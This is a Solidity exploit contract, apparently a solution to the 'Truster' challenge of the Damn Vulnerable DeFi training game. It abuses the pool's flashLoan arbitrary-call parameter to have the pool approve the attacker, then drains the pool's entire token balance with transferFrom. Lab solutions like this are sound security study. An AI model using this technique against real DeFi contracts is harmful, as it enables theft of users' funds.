// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

/**
 * @title TrusterExploit
 * @author scorpion9979
 */
contract TrusterExploit {
    address public immutable BORROWER;
    TrusterLenderPool public immutable POOL;
    DamnValuableToken public immutable TOKEN;

    constructor(
        TrusterLenderPool POOL_,
        address BORROWER_,
        DamnValuableToken TOKEN_
    ) {
        POOL = POOL_;
        BORROWER = BORROWER_;
        TOKEN = TOKEN_;
    }

    function exploit() external {
        uint256 amount = TOKEN.balanceOf(address(POOL));

        POOL.flashLoan(
            0,
            address(0),
            address(TOKEN),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                amount
            )
        );
        TOKEN.transferFrom(address(POOL), BORROWER, amount);
    }
}
